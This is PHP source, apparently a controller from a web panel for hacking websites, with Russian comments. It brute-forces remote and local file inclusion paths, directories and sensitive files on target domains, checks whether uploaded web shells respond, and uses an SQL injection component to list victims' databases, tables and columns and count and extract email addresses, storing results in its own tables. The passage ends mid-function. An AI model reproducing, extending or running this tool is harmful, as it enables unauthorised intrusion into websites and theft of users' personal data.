	
	function check_shell($url){
		$url = str_replace('http://','',$url);
		$res = file_get_contents($url."?g=1");
		if($res ==200)
		{
			return 'good';	
			
		}else{
			
			return 'bad';
		}
		
	}
	
	
	
	
	
	
	///////////// FIND ////////////	
	
	function findrfi($url=''){//RFI
		
		$hal_admin = file( $_SERVER['DOCUMENT_ROOT']."/app/webroot/RFI");
		
		
		$domen = $url;
		
		$url = 'http://'.$url;
		
		foreach ($hal_admin as $val)
		{
			$urls[] = $url.'/'.$val;
		}
		
		//$this->d($urls,'zapusk poiska adminok');
		//exit;
		$cmh = curl_multi_init();
		$tasks = array();
		$i=0;
		
		$count_urls = count($urls);
		//$this->d($count_urls,'$count_urls');

		
		$file = 'rfi.txt';
		mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}");
						
		$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}/$file";
		
		$fp = fopen ($ff, "w");
		$this->d($ff,'ff');
		
		for($i=0;$i<$count_urls;$i++)
		{
			
			
			$this->workup();
			//echo $i.' - i<br>';
			
			if($i==50 or count($urls) == 0)
			{
				//$this->d($i,'count->break'); 
				break;
			}
			
			$urlnew = array_shift($urls);
			
			$ch = $this->streampars($urlnew);
			
			//$this->d($ch);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			
		}
		
		
		
		
		$active = null;

		do 
		{
			$mrc = curl_multi_exec($cmh, $active);
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
				do 
				{
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						$status=curl_getinfo($ch,CURLINFO_HTTP_CODE);
						
						//$this->d($status,'status');
						
						//$this->d($ch,'ch');

						$url = array_search($ch, $tasks);
						
						

						$tasks[$url] = curl_multi_getcontent($ch);
						
						if(($status == 200 AND preg_match("/unipampascanunipampa/i",$tasks[$url])))
						{
							echo "<a target='_blank' href='{$url}'>$url - {$status}</a><br>";
							$kuku = 'yes';
							//$this->d($url.' - $url OTVET GOOD ');
							$url = trim($url);
							fwrite($fp,$url."\r\n");
						}
						
						
						
						

						flush();

						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);
						
						
						
						if(count($urls)>0)
						{
							//echo 'zapusk dopolnitelno<br>';	
							
							$urlnew = array_shift($urls);
							
							
							
							$ch = $this->streampars($urlnew);	

							//	$this->d($ch);							
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}
					}
					
					$this->workup();
					
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}

			fclose($fp);
		if($kuku !='yes'){
			
			$this->d('ne nashol RFI ');
		}

		curl_multi_close($cmh);

		
		
		

	}	 
	
	function findlfi($url=''){//LFI
		
		$hal_admin = file( $_SERVER['DOCUMENT_ROOT']."/app/webroot/LFI");
		
		
		$domen = $url;
		
		$url = 'http://'.$url;
		
		foreach ($hal_admin as $val)
		{
			$urls[] = $url.'/'.$val;
		}
		
		$this->d($urls,'zapusk poiska adminok');
		exit;
		$cmh = curl_multi_init();
		$tasks = array();
		$i=0;
		
		$count_urls = count($urls);
		//$this->d($count_urls,'$count_urls');

		
		$file = 'lfi.txt';
		mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}");
						
		$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}/$file";
		
		$fp = fopen ($ff, "w");
		$this->d($ff,'ff');
		
		for($i=0;$i<$count_urls;$i++)
		{
			
			
			$this->workup();
			//echo $i.' - i<br>';
			
			if($i==50 or count($urls) == 0)
			{
				//$this->d($i,'count->break'); 
				break;
			}
			
			$urlnew = array_shift($urls);
			
			$ch = $this->streampars($urlnew);
			
			//$this->d($ch);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			
		}
		
		
		
		
		$active = null;

		do 
		{
			$mrc = curl_multi_exec($cmh, $active);
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
				do 
				{
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						$status=curl_getinfo($ch,CURLINFO_HTTP_CODE);
						
						//$this->d($status,'status');
						
						//$this->d($ch,'ch');

						$url = array_search($ch, $tasks);
						
						

						$tasks[$url] = curl_multi_getcontent($ch);
						
						if(($status == 200  OR $status == 403 OR $status ==302))
						{
							echo "<a target='_blank' href='{$url}'>$url - {$status}</a><br>";
							$kuku = 'yes';
							//$this->d($url.' - $url OTVET GOOD ');
							$url = trim($url);
							fwrite($fp,$url."\r\n");
						}
						
						
						
						

						flush();

						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);
						
						
						
						if(count($urls)>0)
						{
							//echo 'zapusk dopolnitelno<br>';	
							
							$urlnew = array_shift($urls);
							
							
							
							$ch = $this->streampars($urlnew);	

							//	$this->d($ch);							
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}
					}
					
					$this->workup();
					
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}

			fclose($fp);
		if($kuku !='yes'){
			
			$this->d('ne nashol lfi ');
		}

		curl_multi_close($cmh);

		
		
		

	}	 
	
	function finddirs($url=''){//БРУТФОРС ДИРЕКТОРИЙ
		
		$hal_admin = file( $_SERVER['DOCUMENT_ROOT']."/app/webroot/DIRS");
		
		
		$domen = $url;
		$ip  = gethostbyname($url);
		$ip = 'http://'.$ip;
		$url = 'http://'.$url;
		
		foreach ($hal_admin as $val)
		{
			$urls[] = $url.'/'.$val;
			$urls[] = $ip.'/'.$val;
		}
		
		//$this->d($urls,'zapusk poiska adminok');
		//exit;
		$cmh = curl_multi_init();
		$tasks = array();
		$i=0;
		
		$count_urls = count($urls);
		//$this->d($count_urls,'$count_urls');

		
		$file = 'dirs.txt';
		mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}");
						
		$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}/$file";
		
		$fp = fopen ($ff, "w");
		$this->d($ff,'ff');
		
		for($i=0;$i<$count_urls;$i++)
		{
			
			
			$this->workup();
			//echo $i.' - i<br>';
			
			if($i==50 or count($urls) == 0)
			{
				//$this->d($i,'count->break'); 
				break;
			}
			
			$urlnew = array_shift($urls);
			
			$ch = $this->streampars($urlnew);
			
			//$this->d($ch);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			
		}
		
		
		
		
		$active = null;

		do 
		{
			$mrc = curl_multi_exec($cmh, $active);
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);

$i=0;
		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
				do 
				{
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						$status=curl_getinfo($ch,CURLINFO_HTTP_CODE);
						
						//$this->d($status,'status');
						
						//$this->d($ch,'ch');

						$url = array_search($ch, $tasks);
						
						

						$tasks[$url] = curl_multi_getcontent($ch);
						
						if($status == 200)
						{
							echo "<a target='_blank' href='{$url}'>$url - {$status}</a><br>";
							$kuku = 'yes';
							//$this->d($url.' - $url OTVET GOOD ');
							$url = trim($url);
							fwrite($fp,$url."\r\n");
							$i++;
							if($i==100){
								
								$file = 'dirs.txt';
		
						
								$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}/$file";
		
								$fp = fopen ($ff, "w");
								fwrite($fp,"bad");
								$this->d('Сервер не просканировать всегда 200 отдает');
								return false;
								
							}
						}
						
						
						
						

						flush();

						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);
						
						
						
						if(count($urls)>0)
						{
							//echo 'zapusk dopolnitelno<br>';	
							
							$urlnew = array_shift($urls);
							
							
							
							$ch = $this->streampars($urlnew);	

							//	$this->d($ch);							
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}
					}
					
					$this->workup();
					
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}

			fclose($fp);
		if($kuku !='yes'){
			
			$this->d('ne nashol papok ');
		}

		curl_multi_close($cmh);

		
		
		

	}	 
	
	function findfiles($url=''){//поиск ФАЙЛОВ ИНТЕРЕСНЫХ
		
		$hal_admin = file( $_SERVER['DOCUMENT_ROOT']."/app/webroot/FILES");
		
		$domen = $url;
		
		$ip  = gethostbyname($url);
		$url = 'http://'.$url;
		$ip = 'http://'.$ip;
		
	
		
		foreach ($hal_admin as $val)
		{
			$urls[] = $url.'/'.$val;
			$urls[] = $ip.'/'.$val;
		}
		
		//$this->d($urls,'zapusk poiska adminok');
		//exit;
		$cmh = curl_multi_init();
		$tasks = array();
		$i=0;
		
		$count_urls = count($urls);
		//$this->d($count_urls,'$count_urls');

		$file = 'files.txt';
		mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}");
						
		$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}/$file";
		
		$fp = fopen ($ff, "w");
		$this->d($ff,'ff');
		
		for($i=0;$i<$count_urls;$i++)
		{
			
			
			$this->workup();
			//echo $i.' - i<br>';
			
			if($i==50 or count($urls) == 0)
			{
				//$this->d($i,'count->break'); 
				break;
			}
			
			$urlnew = array_shift($urls);
			
			$ch = $this->streampars($urlnew);
			
			//$this->d($ch);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			
		}
		
		
		
		
		$active = null;

		do 
		{
			$mrc = curl_multi_exec($cmh, $active);
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
				do 
				{
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						$status=curl_getinfo($ch,CURLINFO_HTTP_CODE);
						
						//$this->d($status,'status');
						
						//$this->d($ch,'ch');

						$url = array_search($ch, $tasks);
						
						

						$tasks[$url] = curl_multi_getcontent($ch);
						
						if(($status == 200  OR $status == 403 OR $status ==302))
						{
							echo "<a target='_blank' href='{$url}'>$url - {$status}</a><br>";
							$kuku = 'yes';
							//$this->d($url.' - $url OTVET GOOD ');
							$url = trim($url);
							fwrite($fp,$url."\r\n");
						}
						
						
						
						

						flush();

						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);
						
						
						
						if(count($urls)>0)
						{
							//echo 'zapusk dopolnitelno<br>';	
							
							$urlnew = array_shift($urls);
							
							
							
							$ch = $this->streampars($urlnew);	

							//	$this->d($ch);							
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}
					}
					
					$this->workup();
					
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}

		if($kuku !='yes'){
			
			$this->d('ne nashol ФАЙЛЫ ');
		}

		curl_multi_close($cmh);

		
		
		

	}	 
  
	function findfile($url=''){//существование файла шелла проверяется
		
		$domen = $url;
		
		$hal_admin=array();
		
		$hal_admin[] = $file;
		
		//$this->d($hal_admin,'hal_admin');
		$url = str_replace('http://','',$url);
		$url = 'http://'.$url;
		
		//$url = 'http://188.120.246.26';
		
		
			$urls[] = $url;
				
		//$this->d($urls,'$urls');
		
		$cmh = curl_multi_init();
		$tasks = array();
		$i=0;
		
		$count_urls = count($urls);
		//$this->d($count_urls,'$count_urls');

		
		
		//$fp = fopen ($ff, "w");
		//$this->d($ff,'ff');
		
		for($i=0;$i<$count_urls;$i++)
		{
			
			
			$this->workup();
			//echo $i.' - i<br>';
			
			if($i==50 or count($urls) == 0)
			{
				//$this->d($i,'count->break'); 
				break;
			}
			
			$urlnew = array_shift($urls);
			
			$ch = $this->streampars($urlnew);
			
			//$this->d($ch);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			
		}
		
		
		
		
		$active = null;

		do 
		{
			$mrc = curl_multi_exec($cmh, $active);
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
				do 
				{
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						$status=curl_getinfo($ch,CURLINFO_HTTP_CODE);
						
						//$this->d($status,'status');
						
						//$this->d($ch,'ch');

						$url = array_search($ch, $tasks);
						
						

						$tasks[$url] = curl_multi_getcontent($ch);
						
						if($status == 200)
						{
							$file = 'shell.txt';
							$this->shell_url = $url;
							//mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}");
						
							//$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}/$file";
							echo "<a target='_blank' href='{$url}'>$url - {$status}</a><br>";
							$kuku = 'yes';
							//$this->d($url.' - $url OTVET GOOD ');
							//$url = trim($url);
							//fwrite($fp,$url."\r\n");
						}
						
						
						
						

						flush();

						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);
						
						
						
						if(count($urls)>0)
						{
							//echo 'zapusk dopolnitelno<br>';	
							
							$urlnew = array_shift($urls);
							
							
							
							$ch = $this->streampars($urlnew);	

							//	$this->d($ch);							
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}
					}
					
					$this->workup();
					
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}
		
		if($kuku !='yes'){
			
			//$this->d('netu phpmyadmin');
		}
		

		curl_multi_close($cmh);

		
		
		

	}	

	function findfile2($url=''){//существование способ 2
		
		if(file_get_contents($url."?q=1")==200){
			$this->shell_url = $url;
			return 'good';
			
		}
		

	}	

	/////////////////////////////
	
	
	function oneinfo($url,$domen){//ломает смотрит версия права юзера колонки пишет в БД
		
		
		$this->d($url);
		
		
		
		
		
		
		$this->mysqlInj = new InjectorComponent();
		
		$this->proxyCheck();
		
		$urls = $this->mysqlInj->urlParseUrl($url);
		
	
		
		//$this->d($urls,'urls');
		
		
		foreach ($urls as $url2)
		{
		
				//$this->d($this->mysqlInj->https,'https');
				//$this->d($url2,'url2');
				//exit;
				
				if(preg_match("/get::/i",$url2 ))
				{
					
					$header = 'get';
				}elseif(preg_match("/post::/i",$url2 )){
					$header = 'post';
				}else{
					$header = 'get';
				}
				
		
				$test = $this->mysqlInj->inject($url2);
				
				if($test !=FALSE){
					
					$this->url2 = $url2;
				}
				if($test)break;
		
		}
		
		
		

		if($test!==false)
		{
			
			
			
			$this->mysqlInj->mysqlGetUser();
			
			$this->d($this->mysqlInj->user,'user');
			
			$this->mysqlInj->mysqlGetVersion();
			
			$data = $this->mysqlInj->load_file_priv();
			
			$v = substr($this->mysqlInj->version, 0,1);
			
			
			
			
			$version = $this->mysqlInj->version;
			
			$this->d($version,'version');
			
			if($this->mysqlInj->sleep_metod == true)
			{
				
				$set1['tp']=$this->mysqlInj->set['sleep']['flt']['tp']; 
				$set1['qt']=$this->mysqlInj->set['sleep']['flt']['qt'];
				$set1['sp']=$this->mysqlInj->set['sleep']['flt']['sp'];
				$set1['ed']=$this->mysqlInj->set['sleep']['flt']['ed'];
				$set1['an']=$this->mysqlInj->set['sleep']['flt']['an'];
				$set1['nl']=$this->mysqlInj->set['sleep']['flt']['nl'];
				$set1['sq']=$this->mysqlInj->set['sleep']['flt']['sq'];
				$set1['sl']=$this->mysqlInj->set['sleep']['flt']['sl'];
				
				$set1['scb']= $this->mysqlInj->set['sleep']['scb'];
				$set1['coment']= $this->mysqlInj->set['sleep']['coment'];
				$set1['outp']= $this->mysqlInj->set['sleep']['outp'];
				$set1['hex']= $this->mysqlInj->set['sleep']['hex'];
				$set1['key'] = $this->mysqlInj->ret['sleep']['key'];
				$set1['val'] = $this->mysqlInj->ret['sleep']['val'];
				
				$this->mysqlInj->sleep_data = serialize($set1);
				
			}else{ $this->mysqlInj->sleep_data = 0; }
			
			//$this->d($set1,'$set1');
			//exit;
			////////////////////////////////////////////
			
			
			
			
			$url2 =$this->mysqlInj->url;
			
			$this->d($url2,'$url2222');
			$this->d($this->mysqlInj->method,'$this->mysqlInj->method');
			$this->d($this->mysqlInj->column,'$this->mysqlInj->column');
			$this->d($this->mysqlInj->sposob,'$this->mysqlInj->sposob');
			$this->d($this->mysqlInj->work,  '$this->mysqlInj->work');
			$this->d($this->mysqlInj->user,  '$this->mysqlInj->user');
			$this->d($data['file_priv'],'$data[file_priv]');
			$this->d($this->mysqlInj->sleep_data,'$this->sleep_data');
			
			
			
			$user =   $this->mysqlInj->user;
			$method = $this->mysqlInj->method;
			$sposob = $this->mysqlInj->sposob;
			$column = $this->mysqlInj->column;
			$file_priv = $data['file_priv'];
			if($file_priv ==''){$file_priv=0;}
			$sleep = $this->mysqlInj->sleep_data;
			
			if($method ==10){
				$find = 'sleep_metod';
				
			}elseif($method ==4){
				$find = 'mysqGetValueByError';
				
			}elseif($method ==6){
				$find = 'mysqGetValueByErrorNewW';
			}elseif($method ==5){
				$find = 'mysqlOrderError';
				
			}elseif($method ==0 or $method ==''){
				$find = 'mysqlMovePerebor -- +';
				
			}elseif($method ==1){
				$find = 'mysqlMovePerebor +--+';
				
			}elseif($method ==2){
				$find = 'mysqlMovePerebor %27';
				
			}elseif($method ==3){
				$find = 'mysqlMovePerebor %22';
				
			}
			
			 
			
			$this->d($sleep,'$sleep');
			
			
			if($this->mysqlInj->work==false)
			{	

				$work = $this->mysqlInj->work;

			}else
			{
				
				$str_work ='';
				$work = array_unique($this->mysqlInj->work);
				
				foreach ($work as $val){
					$str_work .=$val.',';
				}
				$work = $str_work;
			}
			
			if($this->mysqlInj->https==true){
				
				$http ='https';
			}else{
				$http ='http';
			}
			
			
			$tic = $this->getcy($domen);
			
			$date = date('Y-m-d h:i:s');
			$maska = $this->get_arg_url($url2);
			$gurl = str_replace('http://','',$url2);
			$gurl = str_replace('https://','',$url2);
			//$gurl = 'http://'.$gurl;
			$url = str_replace('http://','',$url2);
			
				
			
			
			
			
			$this->d("INSERT INTO `posts_one` 
			(`url`,`date`,`maska`,`domen`,`gurl`,`prohod`,`status`,`sposob`,`method`,`column`,`work`,`file_priv`,`sleep`,`tic`,`version`,`find`,`user`,`http`,`header`)
			VALUES ('$url','$date','$maska','$domen','$gurl',5,3,'$sposob','$method','$column','$work','$file_priv','$sleep','$tic','$version','$find','$user','$http','$header')");
			
			
		//	exit;
			
			if($this->Post->query("INSERT INTO `posts_one` 
			(`url`,`date`,`maska`,`domen`,`gurl`,`prohod`,`status`,`sposob`,`method`,`column`,`work`,`file_priv`,`sleep`,`tic`,`version`,`find`,`user`,`http`,`header`)
			VALUES ('$url','$date','$maska','$domen','$gurl',5,3,'$sposob','$method','$column','$work','$file_priv','$sleep','$tic','$version','$find','$user','$http','$header')"))
			{
				echo $domen.' - Добавлен в обработку<br>';	
			}else
			{
				$this->d(mysql_error());
				echo $domen.' - NO<br>';
			}
			
			
			return true;
			
			

		}else
		{
			return false;
			$this->d('sorry ne poluchetsya zaimet dostup k BD');
			
			
			//$this->d($this->mysqlInj,'$this->mysqlInj');
			
		}
		
		
		
		
		
		
	}
	
	function krutaten_one($id,$load='',$clear=1){//функция вывода инфы при просмотре баз и таблиц
		
		
		
		$data = $this->Post->query("SELECT * FROM  `posts_one` WHERE `id`=".$id);
		
		
		
		$data2 = $this->Post->query("SELECT * FROM  `m_users` WHERE `post_id`=".$id);
		
		$data[0][100] = count($data2);
		
		//$this->d($data,"SELECT * FROM  `posts_one` WHERE `id`=".$id);
		
		
		//$this->d(count($data2),'count($data2)');	
		
		
		if($load=='load')
		{
			//$this->d($load,'$load');
			if(isset($clear)){
				
				//$this->d($clear,'$clear');
				
				$this->clearUrl();
				$this->Session->write('field','');
				$this->Session->write('filed','');
				$this->Session->write('getlimit','');
				$this->Session->write('emails','');
				$this->Session->write('getorder','');
				$this->Session->write('getwhere','');
				$this->Session->write('getdesc','');
				$this->Session->write('getdesc','');
				
				
				$this->mysqlInj = new InjectorComponent();
		
		
				$this->mysqlInj->desc_enable=true;
				
				
				
			}

			
			$this->Session->write('inject',$data[0]);
			//$this->Session->write('users',count($data2));
			$this->redirect(array('action'=>'krutaten_one/'.$id));

		}
		
		
		
		
	}
	
	function getbd_one(){//возвращает базы данных через ajax для единичного взлома
		
		$data = $this->Session->read('inject');
		
		
		$squle['Post'] = $data['posts_one'];
		
		
		
		$fieldcount = $this->Post->query("SELECT * FROM  `bds_one` WHERE  `post_id` =".$squle['Post']['id']);
		
		
		$data = $this->Session->read('inject');
		
		unset($data['bds']);

		$this->Session->write('inject',$data);
		
		//Блок заморожен
		
		if(count($fieldcount)>1000000)
		{
			
			
			
			$post_id = $data['posts_one']['id'];
			//echo "<a href='/posts/shlak_bds/$post_id'>Удалить найденные базы из кэша</a><br>";
			
			foreach($fieldcount as $fff)
			{
				//$this->d($fff,'$fff');
				$mailcount3 = "<span style='color:red; font-size:13px;font-weight:700;'>".$fff['bds_one']['count']."</span>";	
				
				
				
				$ku_one = $fff['bds_one']['id'];
				
				$count = $ku_one = $fff['bds_one']['count'];
				$bd = $fff['bds_one']['bd'];
				$ttt = $fff['bds_one']['bd']."($mailcount3)";
				$tmp = "<a onclick='event.returnValue = false; return false;' style='color:black' href='/getTables_one/".$bd."'>".$ttt."</a>";
				
				
				
				
				
				$data['bds'][$count] = $fff['bds_one']['bd'];
				
				//$tmp2 = $ajax->link($bd."($count2)", 'getTables_one/'.$bd,array('indicator'=>'work','escape' => false,'update'=>'bds','style'=>"color:black"));
				//echo $tmp."<br>";
				
				
				
				//echo $ajax->link($bd."($count2)", 'getTables_one/'.$bd,array('indicator'=>'work','escape' => false,'update'=>'bds','style'=>"color:black")).'<br/>
				//echo '<div id="'.$bd.'">';
				
				
			}
			

			//$this->Session->write('inject',$data);
			//$this->set('data',$data);		
			//$this->render('dataone');	

			//$this->redirect(array('action'=>'krutaten_one/'.$squle['Post']['id']));
			
			//exit;
			
		}
		

		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'set');
		}else
		{
			$set = false;
		}
		

		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		

		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);
		
		//$this->d($this->mysqlInj,'$this->mysqlInj');
		
		
		$bds = $this->mysqlInj->mysqlGetAllBd();
		//exit;
		

		
		$post_id = $squle['Post']['id'];
		
		$site = $squle['Post']['domen'];
		
		//$this->d($bds,'$bds');
		//exit;
		
		foreach($bds as $bd)
		{
			
			$fieldcount = $this->Post->query("SELECT * FROM  `bds_one` WHERE  `post_id` ='".$post_id."' AND `bd` = '{$bd}'");
			
			
			$bd_count = $this->mysqlInj->mysqlGetCountTablesBD($bd);
			
			
			//$data2[$bd_count]=$bd;
			
			$data2[$bd]=$bd_count;
			
			//$this->d($bd_count,'$bd_count');
			//exit;
			
			if(count($fieldcount) == 0 )
			{	
				
				
				
				
				if($this->Post->query("INSERT INTO `bds_one` 
				(`post_id`,`bd`,`site`,`count`)
				VALUES ($post_id,'$bd','$site',$bd_count)"))
				{
					//echo $bd.' - Добавлен в кэш<br>';	
				}else
				{
					//echo $bd.' - NO<br>';
				}


			}

		}
		
		
		
		
		$data['bds'] = $data2;
		
		//$this->d($data['bds'],'dadwad');
		
		$this->Session->write('inject',$data);

		$this->set('data',$data);		
		$this->render('dataone');
		//$this->redirect(array('action'=>'krutaten_one/'.$squle['Post']['id']));
		
	}
	
	function getTables_one($bd){ //возвращает таблицы РАБОТАЕТ
		

		$data = $this->Session->read('inject');
		
		
		

		$squle['Post'] = $data['posts_one'];
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
		}
		else
		{
			$set = false;
		}
		
		
		
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		

		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);
		
		//$this->mysqlInj ->inject(trim($squle['Post']['url']),$data,$set);
		
		$data2 = $this->mysqlInj->mysqlGetTablesByDd($bd);
		
		//$this->d($data2,'$data2');
		
		$data['tables'][$bd] = $data2;
		$this->Session->write('inject',$data);


		$this->set('data',$data);		
		$this->render('dataone');
		
		
	}
	
	function getField_one($bd,$table){ //возвращает колонки у таблицы РАБОТАЕТ
		

		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
		}else
		{
			$set = false;
		}
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		

		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);
		
		$data2 = $this->mysqlInj->mysqlGetFieldByTable($bd,$table);

		
		$data['field'][$bd][$table] = $data2;
		$this->Session->write('inject',$data);


		$this->set('data',$data);		
		$this->render('dataone');
		
		
	}
	
	function getcountmail_one($id){//ищет мыла во всех бд и таблицах и и количество мыл считает в таблицах у одиночного взлома
		
		ignore_user_abort(true);
		set_time_limit(0);
		
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		
		

		
		$this->workup();
		
		
		$this->Post->query("UPDATE `posts_one` SET `getmail`=1  WHERE `id`=".$squle['Post']['id']);
		
		$fieldcount = $this->Post->query("SELECT * FROM  `fileds_one` WHERE  `post_id` =".$squle['Post']['id']);
		
		//$this->d($fieldcount,'$fieldcount');
		
		
		if(count($fieldcount)>0)
		{
			$post_id = $data['posts_one']['id'];
			echo "<a href='/posts/shlak_filed/$post_id'>Удалить найденные мыла из кэша</a><br>";
			foreach($fieldcount as $fff)
			{
				
				$mailcount3 = "<span style='color:red; font-size:13px;font-weight:700;'>".$fff['fileds_one']['count']."</span>";	
				$tmp = explode(':',$fff['fileds_one']['ipbase']);
				$ku_one = $fff['fileds_one']['id'];
				$ipbase2 = $tmp[0].':'.$tmp[1].':'.$tmp[2]."({$mailcount3})".':'.$tmp[3];
				
			
				
				$str = "<a target='_blank' href='/posts/getFieldMails_one/".$tmp[1].'/'.$tmp[2]."'  style='color:red'>Раскрыть</a>";
				$data['emails'][] = $ipbase2;
				echo $ipbase2." - ".$str."<br>";
				
				
			}
			

			$this->Session->write('inject',$data);
			//$this->set('data',$data);		
			//$this->render('emailone');		
			exit;
			
		}
		
		
		
		//exit;
		
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			$this->d($set,'set');
		}else
		{
			$set = false;
		}
		
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		$post_id = $squle['Post']['id'];
		
		$url2 = $squle['Post']['url'];
		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);	
		
		
		

		$data3 = $this->mysqlInj->mysqlGetAllValue('information_schema','COLUMNS',array('COLUMN_NAME','TABLE_NAME','TABLE_SCHEMA'),0,array(),'WHERE `COLUMN_NAME` LIKE char('.$this->charcher('%mail%').')');
        
        
       // $data3 = $this->mysqlInj->mysqlGetAllValue('information_schema','COLUMNS',array('COLUMN_NAME','TABLE_NAME','TABLE_SCHEMA'),0,array(),'WHERE `COLUMN_NAME` LIKE char('.$this->charcher('%mail%').') AND ( `DATA_TYPE`=char('.$this->charcher('char').') OR `DATA_TYPE`=char('.$this->charcher('varchar').') OR `DATA_TYPE`=char('.$this->charcher('text').'))');
		
		
		//$this->d($data3,'$data3');
		//exit;
		
		
		
		if(count($data3)>0)
		{
			$this->workup();
			$url = parse_url($squle['Post']['url']);
			$ip = gethostbyname($url['host']);

			$post_id = $data['posts_one']['id'];
			echo "<a href='/posts/shlak_filed/$post_id'>Удалить найденные мыла из кэша</a><br>";
			
			foreach ($data3 as $mail)
			{
				
				
				$mailcount = $this->mysqlInj->mysqlGetCountInsert($mail['TABLE_SCHEMA'],$mail['TABLE_NAME'],'WHERE `'.$mail['COLUMN_NAME'].'` LIKE char('.$this->charcher('%@%').')');
				
				flush();

				if(intval($mailcount)!==0)
				{
					if($mailcount > 1)
					{
						
						$fieldcount = $this->Post->query("SELECT * FROM  `fileds_one` WHERE  `post_id` ='".$post_id."' AND `count` = {$mailcount}");
						
						$this->d($fieldcount,'fieldcount');
						$this->d($ip,'ip');
						$this->d($mail['TABLE_SCHEMA'],'TABLE_SCHEMA');
						$this->d($mail['TABLE_NAME'],'TABLE_NAME');
						$this->d($mailcount,'$mailcount');
						
						$mailcount3 = "<span style='color:red; font-size:13px;font-weight:700;'>".$mailcount."</span>";	
						
						$ipbase2 = $ip.':'.$mail['TABLE_SCHEMA'].':'.$mail['TABLE_NAME']."({$mailcount})".':'.$mail['COLUMN_NAME'];
						
						$ipbase3 = $ip.':'.$mail['TABLE_SCHEMA'].':'.$mail['TABLE_NAME']."({$mailcount3})".':'.$mail['COLUMN_NAME'];
						
						$data['emails'][] = $ipbase3;
						echo $ipbase3."<br>";
						
						 
						
						
						if(count($fieldcount) == 0 )
						{	
							
							$ipbase = $ip.':'.$mail['TABLE_SCHEMA'].':'.$mail['TABLE_NAME'].':'.$mail['COLUMN_NAME'];
